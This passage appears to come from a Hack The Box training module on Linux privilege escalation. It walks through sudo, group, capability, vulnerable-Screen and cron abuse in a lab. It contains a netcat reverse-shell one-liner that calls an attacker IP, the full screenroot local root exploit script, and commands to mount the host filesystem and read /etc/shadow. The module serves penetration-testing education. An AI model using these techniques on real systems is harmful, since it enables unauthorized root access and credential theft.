<pre><code class="lang-shell-session">root@htb[/htb]$ sudo apt-get update -o <span class="hljs-symbol">APT::</span><span class="hljs-symbol">Update::</span>Pre-<span class="hljs-symbol">Invoke::</span>=<span class="hljs-meta-keyword">/bin/</span>sh

<span class="hljs-meta"># id</span>
uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)
</code></pre>
<p>It is worth familiarizing ourselves with as many GTFOBins as possible to quickly identify misconfigurations when we land on a system that we must escalate our privileges to move further.</p>
<h2 id="sudo-rights-abuse">Sudo Rights Abuse</h2>
<hr>
<p>Sudo privileges can be granted to an account, permitting the account to run certain commands in the context of the root (or another account) without having to change users or grant excessive privileges. When the <code>sudo</code> command is issued, the system will check if the user issuing the command has the appropriate rights, as configured in <strong>/etc/sudoers</strong>. When landing on a system, we should always check to see if the current user has any sudo privileges by typing <code>sudo -l</code>. Sometimes we will need to know the user&#39;s password to list their <code>sudo</code> rights, but any rights entries with the <code>NOPASSWD</code> option can be seen without entering a password.</p>
<p>Sudo Rights Abuse</p>
<pre><code class="lang-shell-session">htb_student<span class="hljs-variable">@NIX02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -l

Matching Defaults entries <span class="hljs-keyword">for</span> sysadm on <span class="hljs-symbol">NIX02:</span>
    env_reset, mail_badpass, secure_path=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/sbin\:/usr</span><span class="hljs-regexp">/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span>

User sysadm may run the following commands on <span class="hljs-symbol">NIX02:</span>
    (root) <span class="hljs-symbol">NOPASSWD:</span> /usr/sbin/tcpdump
</code></pre>
<p>It is easy to misconfigure this. For example, a user may be granted root-level permissions without requiring a password. Or the permitted command line might be specified too loosely, allowing us to run a program in an unintended way, resulting is privilege escalation. For example, if the sudoers file is edited to grant a user the right to run a command such as <code>tcpdump</code> per the following entry in the sudoers file: <code>(ALL) NOPASSWD: /usr/sbin/tcpdump</code> an attacker could leverage this to take advantage of a the <strong>postrotate-command</strong> option.</p>
<p>Sudo Rights Abuse</p>
<pre><code class="lang-shell-session">htb_student@NIX02:~$ man tcpdump

&lt;SNIP&gt; 
-z postrorate-<span class="hljs-keyword">command</span>              

Used <span class="hljs-keyword">in</span> conjunction <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> -C <span class="hljs-keyword">or</span> -G options, this will make `tcpdump` run <span class="hljs-string">" postrotate-command file "</span> where <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> is <span class="hljs-keyword">the</span> savefile being closed <span class="hljs-keyword">after</span> <span class="hljs-keyword">each</span> rotation. For example, specifying -z gzip <span class="hljs-keyword">or</span> -z bzip2 will <span class="hljs-built_in">compress</span> <span class="hljs-keyword">each</span> savefile <span class="hljs-keyword">using</span> gzip <span class="hljs-keyword">or</span> bzip2.
</code></pre>
<p>By specifying the <code>-z</code> flag, an attacker could use <code>tcpdump</code> to execute a shell script, gain a reverse shell as the root user or run other privileged commands. For example, an attacker could create the shell script <code>.test</code> containing a reverse shell and execute it as follows:</p>
<p>Sudo Rights Abuse</p>
<pre><code class="lang-shell-session">htb_student<span class="hljs-meta">@NIX</span><span class="hljs-number">02:</span>~$ sudo tcpdump -ln -i eth0 -w <span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span> -W <span class="hljs-number">1</span> -G <span class="hljs-number">1</span> -z <span class="hljs-regexp">/tmp/</span>.test -Z root
</code></pre>
<p>Let&#39;s try this out. First, make a file to execute with the <code>postrotate-command</code>, adding a simple reverse shell one-liner.</p>
<p>Sudo Rights Abuse</p>
<pre><code class="lang-shell-session">htb_student@NIX02:~$ cat <span class="hljs-meta-keyword">/tmp/</span>.test

rm <span class="hljs-meta-keyword">/tmp/</span>f;mkfifo <span class="hljs-meta-keyword">/tmp/</span>f;cat <span class="hljs-meta-keyword">/tmp/</span>f|<span class="hljs-meta-keyword">/bin/</span>sh -i <span class="hljs-number">2</span>&gt;<span class="hljs-variable">&amp;1</span>|nc <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.3</span> <span class="hljs-number">443</span> &gt;<span class="hljs-meta-keyword">/tmp/</span>f
</code></pre>
<p>Next, start a <code>netcat</code> listener on our attacking box run <code>tcpdump</code> as root with the <code>postrotate-command</code>. If all goes to plan, we will receive a root reverse shell connection.</p>
<p>Sudo Rights Abuse</p>
<pre><code class="lang-shell-session">htb_student<span class="hljs-meta">@NIX</span><span class="hljs-number">02:</span>~$ sudo <span class="hljs-regexp">/usr/</span>sbin<span class="hljs-regexp">/tcpdump -ln -i ens192 -w /</span>dev<span class="hljs-regexp">/null -W 1 -G 1 -z /</span>tmp/.test -Z root

dropped privs to root
<span class="hljs-string">tcpdump:</span> listening on ens192, link-type EN10MB (Ethernet), capture size <span class="hljs-number">262144</span> bytes
Maximum file limit <span class="hljs-string">reached:</span> <span class="hljs-number">1</span>
<span class="hljs-number">1</span> packet captured
<span class="hljs-number">6</span> packets received by filter
<span class="hljs-string">compress_savefile:</span> execlp(<span class="hljs-regexp">/tmp/</span>.test, <span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span>) <span class="hljs-string">failed:</span> Permission denied
<span class="hljs-number">0</span> packets dropped by kernel
</code></pre>
<p>We receive a root shell almost instantly.</p>
<p>Sudo Rights Abuse</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ nc -lnvp <span class="hljs-number">443</span>

listening <span class="hljs-literal">on</span> [any] <span class="hljs-number">443</span> ...
connect <span class="hljs-keyword">to</span> [<span class="hljs-number">10.10</span>.<span class="hljs-number">14.3</span>] <span class="hljs-keyword">from</span> (UNKNOWN) [<span class="hljs-number">10.129</span>.<span class="hljs-number">2.12</span>] <span class="hljs-number">38938</span>
bash: cannot set terminal process group (<span class="hljs-number">10797</span>): Inappropriate ioctl <span class="hljs-keyword">for</span> device
bash: <span class="hljs-literal">no</span> job control <span class="hljs-keyword">in</span> <span class="hljs-keyword">this</span> shell

root@NIX02:~<span class="hljs-comment"># id &amp;&amp; hostname               </span>
id &amp;&amp; hostname
uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)
NIX02
</code></pre>
<p><a href="https://wiki.ubuntu.com/AppArmor">AppArmor</a> in more recent distributions has predefined the commands used with the <code>postrotate-command</code>, effectively preventing command execution. Two best practices that should always be considered when provisioning <code>sudo</code> rights:</p>
<table><thead><tr><th width="81"></th><th></th></tr></thead><tbody><tr><td>1.</td><td>Always specify the absolute path to any binaries listed in the <code>sudoers</code> file entry. Otherwise, an attacker may be able to leverage PATH abuse (which we will see in the next section) to create a malicious binary that will be executed when the command runs (i.e., if the <code>sudoers</code> entry specifies <code>cat</code> instead of <code>/bin/cat</code> this could likely be abused).</td></tr><tr><td>2.</td><td>Grant <code>sudo</code> rights sparingly and based on the principle of least privilege. Does the user need full <code>sudo</code> rights? Can they still perform their job with one or two entries in the <code>sudoers</code> file? Limiting the privileged command that a user can run will greatly reduce the likelihood of successful privilege escalation.</td></tr></tbody></table>

<h2 id="privileged-groups">Privileged Groups</h2>
<hr>
<h3 id="lxc-lxd">LXC / LXD</h3>
<p>LXD is similar to Docker and is Ubuntu&#39;s container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at <code>/mnt/root</code>. Let&#39;s confirm group membership and use these rights to escalate to root.</p>
<p>Privileged Groups</p>
<pre><code class="lang-shell-session">devops@<span class="hljs-symbol">NIX02</span>:~$ id

uid=<span class="hljs-number">1009</span><span class="hljs-comment">(devops)</span> gid=<span class="hljs-number">1009</span><span class="hljs-comment">(devops)</span> groups=<span class="hljs-number">1009</span><span class="hljs-comment">(devops)</span>,<span class="hljs-number">110</span><span class="hljs-comment">(lxd)</span>
</code></pre>
<p>Unzip the Alpine image.</p>
<p>Privileged Groups</p>
<pre><code class="lang-shell-session">devops@NIX02:~$ unzip alpine<span class="hljs-selector-class">.zip</span> 

Archive:  alpine<span class="hljs-selector-class">.zip</span>
extracting: <span class="hljs-number">64</span>-bit Alpine/alpine<span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.gz</span>  
inflating: <span class="hljs-number">64</span>-bit Alpine/alpine<span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.gz</span><span class="hljs-selector-class">.root</span>  
cd <span class="hljs-number">64</span>-bit\ Alpine/
</code></pre>
<p>Start the LXD initialization process. Choose the defaults for each prompt. Consult this <a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04">post</a> for more information on each step.</p>
<p>Privileged Groups</p>
<pre><code class="lang-shell-session">devops@NIX02:~$ lxd init

<span class="hljs-keyword">Do</span> you want <span class="hljs-keyword">to</span> configure a <span class="hljs-keyword">new</span> <span class="hljs-keyword">storage</span> pool (yes/<span class="hljs-keyword">no</span>) [<span class="hljs-keyword">default</span>=yes]? yes
<span class="hljs-keyword">Name</span> <span class="hljs-keyword">of</span> the <span class="hljs-keyword">storage</span> backend <span class="hljs-keyword">to</span> <span class="hljs-keyword">use</span> (dir <span class="hljs-keyword">or</span> zfs) [<span class="hljs-keyword">default</span>=dir]: dir
Would you <span class="hljs-keyword">like</span> LXD <span class="hljs-keyword">to</span> be available <span class="hljs-keyword">over</span> the network (yes/<span class="hljs-keyword">no</span>) [<span class="hljs-keyword">default</span>=<span class="hljs-keyword">no</span>]? <span class="hljs-keyword">no</span>
<span class="hljs-keyword">Do</span> you want <span class="hljs-keyword">to</span> configure the LXD bridge (yes/<span class="hljs-keyword">no</span>) [<span class="hljs-keyword">default</span>=yes]? yes

/usr/sbin/dpkg-reconfigure must be run <span class="hljs-keyword">as</span> root
<span class="hljs-keyword">error</span>: <span class="hljs-keyword">Failed</span> <span class="hljs-keyword">to</span> configure the bridge
</code></pre>
<p>Import the local image.</p>
<p>Privileged Groups</p>
<pre><code class="lang-shell-session">devops@NIX02:~$ lxc image import alpine<span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.gz</span> alpine<span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.gz</span><span class="hljs-selector-class">.root</span> --alias alpine

Generating <span class="hljs-selector-tag">a</span> client certificate. This may take <span class="hljs-selector-tag">a</span> minute...
If this is your first <span class="hljs-selector-tag">time</span> using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:<span class="hljs-number">16.04</span>

Image imported with fingerprint: be1ed370b16f6f3d63946d47eb57f8e04c77248c23f47a41831b5afff48f8d1b
</code></pre>
<p>Start a privileged container with the <code>security.privileged</code> set to <code>true</code> to run the container without a UID mapping, making the root user in the container the same as the root user on the host.</p>
<p>Privileged Groups</p>
<pre><code class="lang-shell-session">devops<span class="hljs-variable">@NIX02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>lxc init alpine r00t -c security.privileged=<span class="hljs-keyword">true</span>

Creating r00t
</code></pre>
<p>Mount the host file system.</p>
<p>Privileged Groups</p>
<pre><code class="lang-shell-session">devops@NIX02:~$ lxc config device <span class="hljs-keyword">add</span><span class="bash"> r00t mydev disk <span class="hljs-built_in">source</span>=/ path=/mnt/root recursive=<span class="hljs-literal">true</span>
</span>
Device mydev added to r00t
</code></pre>
<p>Finally, spawn a shell inside the container instance. We can now browse the mounted host file system as root. For example, to access the contents of the root directory on the host type <code>cd /mnt/root/root</code>. From here we can read sensitive files such as <code>/etc/shadow</code> and obtain password hashes or gain access to SSH keys in order to connect to the host system as root, and more.</p>
<pre><code class="lang-shell-session">devops<span class="hljs-variable">@NIX02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>lxc start r00t
devops<span class="hljs-variable">@NIX02</span><span class="hljs-symbol">:~/</span><span class="hljs-number">64</span>-bit Alpine<span class="hljs-variable">$ </span>lxc exec r00t /bin/sh

~ <span class="hljs-comment"># id</span>
uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root)
~ <span class="hljs-comment">#</span>
</code></pre>
<hr>
<h3 id="docker">Docker</h3>
<p>Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command <code>docker run -v /root:/mnt -it ubuntu</code>. This command create a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse to the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as <code>/etc</code> which could be used to retrieve the contents of the <code>/etc/shadow</code> file for offline password cracking or adding a privileged user.</p>
<hr>
<h3 id="disk">Disk</h3>
<p>Users within the disk group have full access to any devices contained within <code>/dev</code>, such as <code>/dev/sda1</code>, which is typically the main device used by the operating system. An attacker with these privileges can use <code>debugfs</code> to access the entire file system with root level privileges. As with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.</p>
<hr>
<h3 id="adm">ADM</h3>
<p>Members of the adm group are able to read all logs stored in <code>/var/log</code>. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.</p>
<pre><code class="lang-shell-session">secaudit@<span class="hljs-symbol">NIX02</span>:~$ id

uid=<span class="hljs-number">1010</span><span class="hljs-comment">(secaudit)</span> gid=<span class="hljs-number">1010</span><span class="hljs-comment">(secaudit)</span> groups=<span class="hljs-number">1010</span><span class="hljs-comment">(secaudit)</span>,<span class="hljs-number">4</span><span class="hljs-comment">(adm)</span>
</code></pre>
<h2 id="capabilities">Capabilities</h2>
<hr>
<p>Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted. This allows for more fine-grained control over which processes have access to certain privileges, making it more secure than the traditional Unix model of granting privileges to users and groups.</p>
<p>However, like any security feature, Linux capabilities are not invulnerable and can be exploited by attackers. One common vulnerability is using capabilities to grant privileges to processes that are not adequately sandboxed or isolated from other processes, allowing us to escalate their privileges and gain access to sensitive information or perform unauthorized actions.</p>
<p>Another potential vulnerability is the misuse or overuse of capabilities, which can result in processes having more privileges than they need. This can create unnecessary security risks, as we could exploit these privileges to gain access to sensitive information or perform unauthorized actions.</p>
<p>Overall, Linux capabilities can be a practical security feature, but they must be used carefully and correctly to avoid vulnerabilities and potential exploits.</p>
<p>Setting capabilities involves using the appropriate tools and commands to assign specific capabilities to executables or programs. In Ubuntu, for example, we can use the <code>setcap</code> command to set capabilities for specific executables. This command allows us to specify the capability we want to set and the value we want to assign.</p>
<p>For example, we could use the following command to set the <code>cap_net_bind_service</code> capability for an executable:</p>
<p><strong>Set Capability</strong></p>
<p>Capabilities</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ sudo setcap cap_net_bind_service=+ep /usr</span><span class="hljs-regexp">/bin/vim</span>.basic
</code></pre>
<p>When capabilities are set for a binary, it means that the binary will be able to perform specific actions that it would not be able to perform without the capabilities. For example, if the <code>cap_net_bind_service</code> capability is set for a binary, the binary will be able to bind to network ports, which is a privilege usually restricted.</p>
<p>Some capabilities, such as <code>cap_sys_admin</code>, which allows an executable to perform actions with administrative privileges, can be dangerous if they are not used properly. For example, we could exploit them to escalate their privileges, gain access to sensitive information, or perform unauthorized actions. Therefore, it is crucial to set these types of capabilities for properly sandboxed and isolated executables and avoid granting them unnecessarily.</p>
<table>
<thead>
<tr>
<th><strong>Capability</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>cap_sys_admin</code></td>
<td>Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.</td>
</tr>
<tr>
<td><code>cap_sys_chroot</code></td>
<td>Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.</td>
</tr>
<tr>
<td><code>cap_sys_ptrace</code></td>
<td>Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes.</td>
</tr>
<tr>
<td><code>cap_sys_nice</code></td>
<td>Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.</td>
</tr>
<tr>
<td><code>cap_sys_time</code></td>
<td>Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.</td>
</tr>
<tr>
<td><code>cap_sys_resource</code></td>
<td>Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.</td>
</tr>
<tr>
<td><code>cap_sys_module</code></td>
<td>Allows to load and unload kernel modules, potentially allowing it to modify the operating system&#39;s behavior or gain access to sensitive information.</td>
</tr>
<tr>
<td><code>cap_net_bind_service</code></td>
<td>Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.</td>
</tr>
</tbody>
</table>
<p>When a binary is executed with capabilities, it can perform the actions that the capabilities allow. However, it will not be able to perform any actions not allowed by the capabilities. This allows for more fine-grained control over the binary&#39;s privileges and can help prevent security vulnerabilities and unauthorized access to sensitive information.</p>
<p>When using the <code>setcap</code> command to set capabilities for an executable in Linux, we need to specify the capability we want to set and the value we want to assign. The values we use will depend on the specific capability we are setting and the privileges we want to grant to the executable.</p>
<p>Here are some examples of values that we can use with the <code>setcap</code> command, along with a brief description of what they do:</p>
<table>
<thead>
<tr>
<th><strong>Capability Values</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>=</code></td>
<td>This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.</td>
</tr>
<tr>
<td><code>+ep</code></td>
<td>This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.</td>
</tr>
<tr>
<td><code>+ei</code></td>
<td>This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.</td>
</tr>
<tr>
<td><code>+p</code></td>
<td>This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it.</td>
</tr>
</tbody>
</table>
<p>Several Linux capabilities can be used to escalate a user&#39;s privileges to <code>root</code>, including:</p>
<table>
<thead>
<tr>
<th><strong>Capability</strong></th>
<th><strong>Desciption</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>cap_setuid</code></td>
<td>Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the <code>root</code> user.</td>
</tr>
<tr>
<td><code>cap_setgid</code></td>
<td>Allows to set its effective group ID, which can be used to gain the privileges of another group, including the <code>root</code> group.</td>
</tr>
<tr>
<td><code>cap_sys_admin</code></td>
<td>This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the <code>root</code> user, such as modifying system settings and mounting and unmounting file systems.</td>
</tr>
<tr>
<td><code>cap_dac_override</code></td>
<td>Allows bypassing of file read, write, and execute permission checks.</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="enumerating-capabilities">Enumerating Capabilities</h3>
<p>It is important to note that these capabilities should be used with caution and only granted to trusted processes, as they can be misused to gain unauthorized access to the system. To enumerate all existing capabilities for all existing binary executables on a Linux system, we can use the following command:</p>
<p><strong>Enumerating Capabilities</strong></p>
<p>Capabilities</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ find /</span>usr<span class="hljs-regexp">/bin /</span>usr<span class="hljs-regexp">/sbin /</span>usr<span class="hljs-regexp">/local/</span>bin <span class="hljs-regexp">/usr/</span>local/sbin -type f -exec getcap {} \;

<span class="hljs-regexp">/usr/</span>bin/vim.basic cap_dac_override=eip
<span class="hljs-regexp">/usr/</span>bin/ping cap_net_raw=ep
<span class="hljs-regexp">/usr/</span>bin/mtr-packet cap_net_raw=ep
</code></pre>
<p>This one-liner uses the <code>find</code> command to search for all binary executables in the directories where they are typically located and then uses the <code>-exec</code> flag to run the <code>getcap</code> command on each, showing the capabilities that have been set for that binary. The output of this command will show a list of all binary executables on the system, along with the capabilities that have been set for each.</p>
<hr>
<h3 id="exploitation">Exploitation</h3>
<p>If we gained access to the system with a low-privilege account, then discovered the <code>cap_dac_override</code> capability:</p>
<p><strong>Exploiting Capabilities</strong></p>
<p>Capabilities</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ getcap /</span>usr<span class="hljs-regexp">/bin/</span>vim.basic

<span class="hljs-regexp">/usr/</span>bin/vim.basic cap_dac_override=eip
</code></pre>
<p>For example, the <code>/usr/bin/vim.basic</code> binary is run without special privileges, such as with <code>sudo</code>. However, because the binary has the <code>cap_dac_override</code> capability set, it can escalate the privileges of the user who runs it. This would allow the penetration tester to gain the <code>cap_dac_override</code> capability and perform tasks that require this capability.</p>
<p>Let us take a look at the <code>/etc/passwd</code> file where the user <code>root</code> is specified:</p>
<p>Capabilities</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ cat /</span>etc/passwd | head -n1
<span class="hljs-symbol">
root:</span><span class="hljs-string">x:</span><span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-string">root:</span><span class="hljs-regexp">/root:/</span>bin/bash
</code></pre>
<p>We can use the <code>cap_dac_override</code> capability of the <code>/usr/bin/vim</code> binary to modify a system file:</p>
<p>Capabilities</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ /</span>usr<span class="hljs-regexp">/bin/</span>vim.basic <span class="hljs-regexp">/etc/</span>passwd
</code></pre>
<p>We also can make these changes in a non-interactive mode:</p>
<p>Capabilities</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-keyword">echo</span> -<span class="hljs-keyword">e</span> <span class="hljs-string">':%s/^root:[^:]*:/root::/\nwq!'</span> | /usr/bin/<span class="hljs-keyword">vim</span>.basic -es /etc/passwd
root@htb[/htb]$ <span class="hljs-keyword">cat</span> /etc/passwd | head -n1

roo<span class="hljs-variable">t:</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:roo<span class="hljs-variable">t:</span>/roo<span class="hljs-variable">t:</span>/bin/bash
</code></pre>
<p>Now, we can see that the <code>x</code> in that line is gone, which means that we can use the command <code>su</code> to log in as root without being asked for the password.</p>
<h2 id="vulnerable-services">Vulnerable Services</h2>
<hr>
<p>Many services may be found, which have flaws that can be leveraged to escalate privileges. An example is the popular terminal multiplexer <a href="https://linux.die.net/man/1/screen">Screen</a>. Version 4.5.0 suffers from a privilege escalation vulnerability due to a lack of a permissions check when opening a log file.</p>
<p><strong>Screen Version Identification</strong></p>
<p>Vulnerable Services</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ screen -v

Screen version <span class="hljs-number">4.05</span><span class="hljs-number">.00</span> (GNU) <span class="hljs-number">10</span>-Dec<span class="hljs-number">-16</span>
</code></pre>
<p>This allows an attacker to truncate any file or create a file owned by root in any directory and ultimately gain full root access.</p>
<p><strong>Privilege Escalation - Screen_Exploit.sh</strong></p>
<p>Vulnerable Services</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ./screen_exploit.<span class="hljs-keyword">sh</span> 

~ gnu/screenroot ~
[+] First, we create our <span class="hljs-keyword">shell</span> and library...
[+] Now we create our /etc/ld.<span class="hljs-keyword">so</span>.preload <span class="hljs-keyword">file</span>...
[+] Triggering...
' from /etc/ld.<span class="hljs-keyword">so</span>.preload cannot be preloaded (cannot <span class="hljs-keyword">open</span> shared object <span class="hljs-keyword">file</span>): ignored.
[+] done!
<span class="hljs-keyword">No</span> Sockets found <span class="hljs-keyword">in</span> /<span class="hljs-keyword">run</span>/screen/S-mrb3n.

# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(mrb3n)
</code></pre>
<p>The below script can be used to perform this privilege escalation attack:</p>
<p><strong>Screen_Exploit_POC.sh</strong></p>
<p>Code: bash</p>
<pre><code class="lang-bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-meta"># screenroot.sh</span>
<span class="hljs-meta"># setuid screen v4.5.0 local root exploit</span>
<span class="hljs-meta"># abuses ld.so.preload overwriting to get root.</span>
<span class="hljs-meta"># bug: https:<span class="hljs-comment">//lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span>
<span class="hljs-meta"># HACK THE PLANET</span>
<span class="hljs-meta"># ~ infodox (25/1/2017)</span>
echo <span class="hljs-string">"~ gnu/screenroot ~"</span>
echo <span class="hljs-string">"[+] First, we create our shell and library..."</span>
cat <span class="hljs-params">&lt;&lt; EOF &gt;</span> <span class="hljs-meta-keyword">/tmp/</span>libhax.c
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span>
__attribute__ ((__constructor__))
void dropshell(void){
    chown(<span class="hljs-string">"/tmp/rootshell"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
    chmod(<span class="hljs-string">"/tmp/rootshell"</span>, <span class="hljs-number">04755</span>);
    unlink(<span class="hljs-string">"/etc/ld.so.preload"</span>);
    printf(<span class="hljs-string">"[+] done!\n"</span>);
}
EOF
gcc -fPIC -shared -ldl -o <span class="hljs-meta-keyword">/tmp/</span>libhax.so <span class="hljs-meta-keyword">/tmp/</span>libhax.c
rm -f <span class="hljs-meta-keyword">/tmp/</span>libhax.c
cat <span class="hljs-params">&lt;&lt; EOF &gt;</span> <span class="hljs-meta-keyword">/tmp/</span>rootshell.c
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
int main(void){
    setuid(<span class="hljs-number">0</span>);
    setgid(<span class="hljs-number">0</span>);
    seteuid(<span class="hljs-number">0</span>);
    setegid(<span class="hljs-number">0</span>);
    execvp(<span class="hljs-string">"/bin/sh"</span>, NULL, NULL);
}
EOF
gcc -o <span class="hljs-meta-keyword">/tmp/</span>rootshell <span class="hljs-meta-keyword">/tmp/</span>rootshell.c -Wno-implicit-function-declaration
rm -f <span class="hljs-meta-keyword">/tmp/</span>rootshell.c
echo <span class="hljs-string">"[+] Now we create our /etc/ld.so.preload file..."</span>
cd /etc
umask <span class="hljs-number">000</span> <span class="hljs-meta"># because</span>
screen -D -m -L ld.so.preload echo -ne  <span class="hljs-string">"\x0a/tmp/libhax.so"</span> <span class="hljs-meta"># newline needed</span>
echo <span class="hljs-string">"[+] Triggering..."</span>
screen -ls <span class="hljs-meta"># screen itself is setuid, so...</span>
<span class="hljs-meta-keyword">/tmp/</span>rootshell
</code></pre>
<h2 id="cron-job-abuse">Cron Job Abuse</h2>
<hr>
<p>Cron jobs can also be set run one time (such as on boot). They are typically used for administrative tasks such as running backups, cleaning up directories, etc. The <code>crontab</code> command can create a cron file, which will be run by the cron daemon on the schedule specified. When created, the cron file will be created in <code>/var/spool/cron</code> for the specific user that creates it. Each entry in the crontab file requires six items in the following order: minutes, hours, days, months, weeks, commands. For example, the entry <code>0 */12 * * * /home/admin/backup.sh</code> would run every 12 hours.</p>
<p>The root crontab is almost always only editable by the root user or a user with full sudo privileges; however, it can still be abused. You may find a world-writable script that runs as root and, even if you cannot read the crontab to know the exact schedule, you may be able to ascertain how often it runs (i.e., a backup script that creates a <code>.tar.gz</code> file every 12 hours). In this case, you can append a command onto the end of the script (such as a reverse shell one-liner), and it will execute the next time the cron job runs.</p>
<p>Certain applications create cron files in the <code>/etc/cron.d</code> directory and may be misconfigured to allow a non-root user to edit them.</p>
<p>First, let&#39;s look around the system for any writeable files or directories. The file <code>backup.sh</code> in the <code>/dmz-backups</code> directory is interesting and seems like it could be running on a cron job.</p>
<p>Cron Job Abuse</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ find /</span> -path <span class="hljs-regexp">/proc -prune -o -type f -perm -o+w 2&gt;/</span>dev/<span class="hljs-literal">null</span>

<span class="hljs-regexp">/etc/</span>cron.daily/backup
<span class="hljs-regexp">/dmz-backups/</span>backup.sh
/proc
<span class="hljs-regexp">/sys/</span>fs<span class="hljs-regexp">/cgroup/</span>memory<span class="hljs-regexp">/init.scope/</span>cgroup.event_control

&lt;SNIP&gt;
<span class="hljs-regexp">/home/</span>backupsvc/backup.sh

&lt;SNIP&gt;
</code></pre>
<p>A quick look in the <code>/dmz/backups</code> directory shows what appears to be files created every three minutes. This seems to be a major misconfiguration. Perhaps the sysadmin meant to specify every three hours like <code>0 */3 * * *</code> but instead wrote <code>*/3 * * * *</code>, which tells the cron job to run every three minutes. The second issue is that the <code>backup.sh</code> shell script is world writeable and runs as root.</p>
<p>Cron Job Abuse</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ls -la /dmz-backups/

total 36
drwxrwxrwx <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 31 </span>02:39 .
drwxr-xr-x<span class="hljs-number"> 24 </span>root root<span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 31 </span>02:24 ..
